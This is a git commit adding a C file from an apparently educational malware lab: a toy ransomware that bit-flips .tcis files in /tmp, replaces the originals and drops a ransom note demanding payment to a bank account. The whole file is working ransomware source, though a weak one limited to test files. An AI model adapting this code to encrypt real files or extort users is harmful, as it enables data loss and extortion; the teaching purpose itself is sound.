85812d1e82d6959775b24f3714c010f40bbd516e
Weiyang Zhang <sunnylocus@email.arizona.edu>
2021-03-05 13:31:03 -0800

    lab test files

---
+++ ransomware2.c
@@ -0,0 +1,143 @@
+/**
+ *
+ * @brief      This program is written by Weiyang Zhang, for the malware lab experiment. The purpose of this program
+ *             is to make students have a sense of what a ransomware is. Students will be guided to run the program, and
+ *             all of files on destop will be encrypted using an invertable algorithm, that is, all files on desktop will
+ *             be encrypted by running the program the first time,and all files will be decrypted when executing it by the
+ *             second time.
+ *
+ * @author     Weiyang Zhang
+ * @date       7/12/2020
+ */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <errno.h>
+#include <string.h>
+#include <dirent.h>
+#include <unistd.h>
+
+#define MAX_LEN 512
+/**
+ * This method is used to get file extention.
+ * @param  filename [description]
+ * @return          [description]
+ */
+const char *get_filename_ext(const char *filename)
+{
+	const char *dot = strrchr(filename, '.');
+	if (!dot || dot == filename)
+		return "";
+	return dot + 1;
+}
+
+/**
+ * This method is used to create a text file which its size is 1GB in the
+ * directory /tmp
+ * [create_large_file description]
+ */
+const void create_large_file()
+{
+	printf("Generating test file in the direction /tmp\n");
+	FILE *fp;
+	fp = fopen("/tmp/labtest.tcis", "w");
+	int size = 1024 * 1024 * 100; //100MB size
+	fseek(fp, size, SEEK_CUR);
+	fputs("Lab Test for TCIS project", fp);
+	fclose(fp);
+
+	char buffer[] = {'a'};
+
+	fp = fopen("/tmp/labtest.tcis", "w");
+	for (int i = 0; i < size; ++i)
+	{
+		fwrite(buffer, sizeof(char), sizeof(buffer), fp);
+	}
+	fclose(fp);
+	printf("Completed!\n");
+}
+
+
+int main(int argc, char const *argv[])
+{
+
+	if (! access("/tmp/labtest.tcis", F_OK) == 0)
+		create_large_file();
+
+	//Format the desired directory that we want to encrypt
+	char dest_encrypt_dir[MAX_LEN] = "/tmp/";
+
+	struct dirent *de; // Pointer for directory entry
+	DIR *dr = opendir(dest_encrypt_dir);
+	if (dr == NULL)
+	{
+		perror("Could not open the directory");
+		return -1;
+	}
+
+	char full_file_path[MAX_LEN];
+
+	while ((de = readdir(dr)) != NULL) {
+		char src[MAX_LEN], tgt[MAX_LEN], ch;
+		memset(full_file_path, 0, MAX_LEN);
+
+		strcat(full_file_path, dest_encrypt_dir);
+		strcat(full_file_path, de->d_name);
+
+		//for test purpose we only encrypt tcis files.
+		const char *ext = get_filename_ext(full_file_path);
+		if( strcmp(ext, "tcis")!=0)
+		  continue;
+
+		FILE *fs;
+		fs = fopen(full_file_path, "rb");
+
+		if (fs == NULL)
+			continue;
+
+		sprintf(tgt , "%s.ed", full_file_path); //format the name of the temporary file
+
+		FILE *ft;
+		ft = fopen(tgt, "w");
+		if (ft == NULL)
+			continue;
+
+		printf("Ransomware starts to encrypt file!\n");
+		int blockSize = 256;
+		char buff[blockSize];
+
+		size_t n;
+		while ( (n = fread(buff, 1, blockSize, fs)) != 0) {
+			for (int i = 0; i < n ; i++)
+				buff[i] = ~buff[i]; // encrypt or decrypt
+
+			fwrite(buff, 1, n, ft);
+		}
+
+		fclose(fs);
+		fclose(ft);
+
+		remove(full_file_path);
+		rename(tgt, full_file_path);
+		printf("Ransomware has finished encrypting the file!\n");
+	}
+
+	closedir(dr);
+
+
+	FILE *fwarning;
+
+	fwarning = fopen("/tmp/ReadMe.txt", "w");
+
+	if ( fwarning != NULL)
+	{
+		fputs("\n********************************** Warning !!! **********************************\n", fwarning);
+		fputs("All files on this computer have been encrypted!! You must pay $1,000 to decrypt.\n", fwarning);
+		fputs("Please send money to this bank account: 8989 82838 82800 1937 (Chase Bank). \nOnce I have received your money, you will get the decrypt tool.\n\nThanks for your cooperation!\n", fwarning);
+		fputs("*********************************************************************************", fwarning);
+	}
+	fclose(fwarning);
+
+
+	return 0;
+}
